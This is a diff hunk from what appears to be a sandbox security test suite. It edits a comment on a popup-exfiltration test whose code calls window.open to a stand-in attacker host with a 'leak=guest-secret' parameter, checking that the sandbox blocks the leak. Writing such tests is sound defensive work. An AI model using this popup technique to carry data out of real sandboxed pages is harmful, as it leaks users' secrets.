@@ -538,7 +538,7 @@ console.log('TEST_DONE');`,
         research: "13_popup_exfiltration",
         target: "https://attacker.example",
         // A popup is a new top-level window that no CSP governs: its URL carries data out. allow-popups passed
-        // as a regular capability is dropped (with a warning); only unsafeCapabilities enables it.
+        // as a regular capability is refused (start() throws); only unsafeCapabilities enables it.
         code: `let outcome;
 try {
     outcome = window.open('https://attacker.example/?leak=guest-secret') ? 'opened' : 'refused';
